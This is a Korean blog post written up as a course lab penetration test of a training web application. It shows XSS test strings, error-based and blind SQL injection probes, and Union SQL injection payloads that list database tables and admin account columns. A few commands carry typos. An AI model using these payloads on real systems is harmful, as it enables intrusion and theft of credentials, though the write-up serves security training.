---
layout: post
title: The old version of KISEC
subtitle: The old version of KISEC Pentest
categories: Pentest
tags: [Pentest, TTPs]
---

**본 내용 및 실습 환경은 KISEC, 케이쉴드 주니어 교육 과정에 있음을 알려드립니다.**

이번에는 한국인터넷진흥원(KISA)에서 제공하는 보안 취약점 및 침해사고 대응의 **주요 정보 통신 기반 시설 기술적 취약점 분석 평가 상세 가이드**를 중점으로 모의해킹 및 취약점 진단을 진행 하려합니다.

해당 가이드를 보면 여러 항목이 있지만 Web을 기반으로 진단하므로 Web에 대한 개요를 살펴 보면서 진행하겠습니다.

해당 가이드는 [링크](https://www.kisa.or.kr/2060204)를 통해서 볼 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/183579387-481d1736-8f9e-42e0-bbed-932407e94f57.jpg" width = 500>
</p>

## 정보 수집

정보 수집 개요는 해당 가이드에 명시 된 바는 없지만 fngs.kr를 모의해킹 하면서 알아봤던 정보 수집을 간단하게 복습하는 차원에서 보겠습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/183580021-db074e91-a0cf-412a-9651-7cc22643ac74.jpg" width = 420>
</p>

* `whatweb 10.200.43.12`
  * 이렇게 이미지 보기 쉽게 하기 위해서 옵션을 주지 않았지만, 더욱 자세히 보기 위해서는 `-v` 옵션을 주는 것을 권장드립니다.
  * **Apache**
    * 해당 버전은 구글링하면 CVE 점수가 7.5나 되는 취약점을 지니고 있음을 알 수 있다.
  * 취약한 부분을 제외하고도 해당 웹 서버는 무엇을 쓰고 있는지 확인할 수 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184569715-407dff17-d2c0-428a-ae56-652edaf8d9aa.jpg" width = 320>
</p>

* `nmap 10.200.43.12 -O -sS -T3`
  * 어떤 포트를 열고 어떠한 서비스를 사용하고 있는지 알 수 있다.
  * 일부분만 캡쳐해서 모든 내용이 보이지 않지만 어떠한 운영 체제를 사용하고 있는지 추정해주는 부분도 있으므로 직접 해보는 것을 추천드립니다.

## 파일 다운로드

파일 다운로드에 대해서는 **Web_Vulnerability** 카테고리에서 Old version of KISEC으로 실습했으니 해당 [링크](https://peoplstar.github.io/web_vulnerability/2022/08/09/File-Download.html)를 통해서 보는게 좋을 것 같습니다.

(동일한 내용과 환경이기에 보기에 불편함은 없으실 것으로 예상됩니다.)

## 크로스사이트 스크립팅

점검 문자열로는 `<script>alert("documnet.cookie");</script>`와 `<iframe src = "url"></iframe>`를 점검 할 것이다.
<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/183585841-133020e6-cfc5-4e04-9566-ea87ae3f091d.jpg" width = 320 alien = 'left'>
</p>

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/183585974-8b8cfaa5-ba72-48dd-82df-e90bd1deb96d.jpg" width = 320 alien = 'right'>
</p>

* 취약점 현황
  * 발견 URL
    * `http://10.200.43.12/kisec/mypage/mypage_mtm_list.html`
    * `http://10.200.43.12/kisec/mypage/mypage_coupon_buy_list.html`
  
본문 내용의 스크립트 구문 삽입 시 해당 스크립트가 실행되는 취약점 발견 이로인해 타 사용자 권한 획득 또는 악성서버 유도를 통해 홈페이지를 방문한 사용자가 악성코드가 감염될 가능성이 있다.

## 데이터 평문 전송

대부분의 웹은 HTTPS를 이용하여 데이터 평문 전송이 가능한 곳은 거의 없을 것이다. 하지만, 단순 로그인 화면에서만 HTTPS를 제공하고 회원 탈퇴, 게시물 등록 인증 등 이러한 부분에서 HTTP를 이용하게 되면 중요 정보가 평문으로 전송 될 가능성이 있다.

단순히 SSL/TLS 사용하는 것이 최신 버전, 현 시점 적어도 TLS 1.2 이상의 버전을 이용해야한다. 

평문 전송이 되는지 Wireshark를 통해서 알아본다.

로그인 할 때 Wireshark 캡쳐를 시작하고 로그인을 시도해보겠습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/183590511-ed275163-1a53-46ca-adde-81effec7c7d4.jpg" width = 500>
</p>

수도 없이 많은 패킷이 잡혔다. **Ctrl + F**(Find Packet), **Packet details**, **String** 옵션을 적용하고 로그인에 사용된 아이디를 검색해보겠습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/183591143-7708a68e-3772-4fab-9157-cde2bab1b47d.jpg" width = 500>
</p>

이 처럼 평문 전송이 되는 것을 알 수 있다. 이러한 문제는 공격자가 스니핑을 진행하고 있었다면 중요 정보가 모두 공격자에게 넘어간 것이다.

* SSL/TLS 버전 확인 구문
  * `nmap --script ssl-enum-chipers <진단 URL> -p443 unpriviledged`
  * SSL/TLS가 어떤 버전을 사용하고 있는지 이것으로 진단 할 수 있다.
  * 진단을 통해 취약점을 이용한 Exploit이 가능하다.

## 불충분한 인가

관리자 권한으로 공지사항의 게시글을 등록, 수정, 삭제 할 수 있도록 구현하였으나 이 때 파라미터의 권한에 해당하는 값만 의존해서 권한을 결정하도록 구현하였을 때 취약점이 발생할 수 있다. 

**즉, 접근 권한에 대한 인증 프로세스 및 올바른 접근 통제 로직이 구현되지 않아 다른 사용자의 민감한 정보나 인가되지 않은 페이지에 접근할 수 있는 것을 의미한다.**

## SQL Injection
### 에러 페이지 반환 점검

첫번째 SQLi 점검 기법으로 **'**(싱글 쿼테이션)을 하나 추가하여 Query문을 비정상적으로 만드는 것이다. 

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184571353-47f09812-253b-46a6-a6e5-63e518d350f2.jpg" width = 420>
</p>

* 해당 URL : http://10.200.43.12/kisec/dataRoom/kisec_lab.html?keyfield=t1.b_title&keyword='

해당 검색란에 **'**(싱글 쿼테이션)을 넣으면 비정상적인 쿼리로 인해 DB 에러 페이지가 노출된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184571599-0705d2e3-d229-4463-9925-9bc152a84556.jpg" width = 380>
</p>

데이터베이스의 주요 정보가 노출되지 않았지만, 이처럼 쿼리자체에 문제가 있다고 노출시키는 것만으로 타 공격자에 의해 무차별적 공격이 이루어질 수 있다.

_위 증상이 발생하는 페이지_

* **커뮤니티**
   * **공지사항** : http://10.200.43.12/kisec/dataRoom/notice.html?keyfield=t1.b_title&keyword='
   * **KISEC Album** : http://10.200.43.12/kisec/dataRoom/kisec_album.html?keyfield=t1.b_title&keyword='
   * **f-NGS Lab** : http://10.200.43.12/kisec/dataRoom/kisec_lab.html?keyfield=t1.b_title&keyword=
   * **수강 후기** : http://10.200.43.12/kisec/dataRoom/after.html?keyfield=t1.b_title&keyword=
   * **공통 인덱스** : 각 게시물 URL **idx** parameter

* **로그인**
   * **모든 입력란** : http://10.200.43.12/kisec/member/join_m_step02.html

### Blind SQLi

쿼리문을 전송하고 이 쿼리의 참, 거짓 여부를 활용하여 데이터를 얻어내는 점검 방식을 말합니다.

웹 페이지를 여는 URL의 **indx** 부분에
`and 1=1 -- `를 추가하였을 때, 만약 응답 기반의 취약점이 존재한다면 and 이후 문장의 참 / 거짓 여부에 따라 정상 / 에러 페이지가 결정된다.

* **참일 경우**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184587199-88b3eb47-245a-4945-bbb2-f1d1dc35daf4.jpg" width = 420>
</p>

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184587205-d1ff2014-be09-44fc-ba9a-548d84349b5c.jpg" width = 420>
</p>

* **거짓일 경우**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184587485-e21ee6e5-56f9-4282-943f-228c3811f773.jpg" width = 420>
</p>

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184587489-6bee916a-8262-4193-8e07-d7be4724a93c.jpg" width = 420>
</p>


### 모의 침투

Union SQL Injection을 이용한 모의 침투를 실시한다.

```
http://10.200.43.12/kisec/dataRoom/notice_view.html?idx=36&keyfield=&keyword=
http://10.200.43.12/kisec/dataRoom/kisec_lab_view.html?idx=26&keyfield=&keyword=
http://10.200.43.12/kisec/dataRoom/after_view.html?idx=37&keyfield=&keyword=
```

홈 > 커뮤니티 : `KISEC ALBUM`을 제외한 3개의 URL **idx** parameter를 이용한다.

* INFORMATION_SCHEMAS : 데이터베이스의 정보를 담고 있으며 모든 Table과 Column의 정보 역시 포함하고 있습니다.

데이터베이스 종류 | 연결 연산자|
:-----:|:-----:|
TABLES | DB 내의 모든 테이블 정보
COLUMNS | DB 내의 모든 칼럼 정보

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184582642-a751e470-2272-4e3a-863c-1e37ba9216f2.jpg" width = 420>
</p>

```SQL 
' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, GROUP_CONCAT(TABLE_NAME SEPARATOR ' '), 17, 18 FROM INFORMATION_SCHEMA.TABLES -- 
```
(주석인 **--** 뒤에 공백 필요)

현재 사용중인 데이터베이스의 모든 테이블 값이 출력되는 것을 알 수 있다.

이 중에서 노출되면 위험하다고 예상되는 부분인 `USER_PRIVILEGES, add_info, admin_mem, hm_admin_tb`가 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184585396-1778885b-ce25-4759-9a33-610099b94879.jpg" width = 420>
</p>

```SQL
' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, GROUP_CONCAT(COLUMNS_NAME SEPARATOR ' '), 17, 18 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "HM_ADMIN_TB" -- 
```

* hm_admin_tb
   * `idx admin_status admin_type admin_id admin_pass admin_name admin_phone admin_mobile admin_email admin_grade admin_hit admin_cmt reg_date last_date`

이 테이블에는 관리자 계정에 관한 정보가 들어있는 것을 알 수 있다.

**이와 같은 방식으로 원하는 테이블 명과 컬럼 명 및 세부 정보까지 확인할 수 있다.**
